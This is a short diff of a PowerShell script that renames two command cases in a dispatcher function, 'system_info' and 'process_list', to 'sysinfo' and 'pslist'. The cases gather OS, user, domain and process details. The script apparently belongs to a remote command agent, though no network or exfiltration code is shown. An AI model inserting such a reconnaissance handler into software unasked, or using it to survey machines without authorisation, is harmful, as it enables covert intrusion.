@@ -88,7 +88,7 @@ function Run($c, $a) {
                 @{success=$false; error="$_"}
             }
         }
-        "system_info" {
+        "sysinfo" {
             $os = Get-CimInstance Win32_OperatingSystem
             @{
                 success=$true
@@ -100,7 +100,7 @@ function Run($c, $a) {
                 domain=$env:USERDOMAIN
             }
         }
-        "process_list" {
+        "pslist" {
             @{success=$true; processes=@(Get-Process | Select-Object -First 50 | ForEach-Object {
                 @{name=$_.Name; pid=$_.Id; mem=$_.WorkingSet64}
             })}
